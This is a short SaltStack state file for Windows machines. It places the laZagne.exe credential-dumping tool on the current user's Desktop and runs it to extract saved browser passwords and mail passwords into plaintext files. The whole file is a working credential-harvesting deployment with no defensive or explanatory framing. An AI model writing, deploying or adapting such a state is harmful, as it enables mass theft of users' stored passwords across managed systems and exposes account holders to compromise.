{% set userval = salt['user.current']() %}

place_lazagne:
  file.managed:
    - name: "C:\\Users\\{{ userval }}\\Desktop\\{{ userval }} info\\laZagne.exe"
    - source: salt://installers/laZagne.exe
    - win_inheritance: True
    - makedirs: True

run browser pass:
  cmd.run:
    - cwd: "C:\\Users\\{{ userval }}\\Desktop\\{{ userval }} info"
    - name: "laZagne.exe browsers > browserpasses.txt"

run mail pass:
  cmd.run:
    - cwd: "C:\\Users\\{{ userval }}\\Desktop\\{{ userval }} info"
    - name: "laZagne.exe mails > mailpasses.txt"

